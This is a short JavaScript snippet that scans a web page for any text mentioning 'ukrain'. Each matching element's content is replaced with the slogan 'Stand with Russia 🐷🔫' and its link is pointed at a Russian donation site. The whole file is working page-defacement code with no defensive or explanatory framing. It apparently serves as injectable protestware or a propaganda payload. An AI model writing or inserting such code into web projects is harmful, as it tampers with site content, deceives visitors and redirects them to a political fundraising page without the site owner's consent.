var word = "ukrain",
    queue = [document.body],
    curr;

while (curr = queue.pop()) {
  if (!curr.textContent.toLowerCase().match(word)) continue;

  for (var i = 0; i < curr.childNodes.length; ++i) {
    switch (curr.childNodes[i].nodeType) {
      case Node.TEXT_NODE :
        if (curr.childNodes[i].textContent.toLowerCase().match(word)) {
          if(curr) {
            curr.innerHTML = "Stand with Russia 🐷🔫";
            curr.href = "https://pobeda.onf.ru/#donate1_anch"
          }
          console.log("Found!");
          console.log(curr);
        }
        break;
      case Node.ELEMENT_NODE :
        queue.push(curr.childNodes[i]);
        break;
    }
  }
} 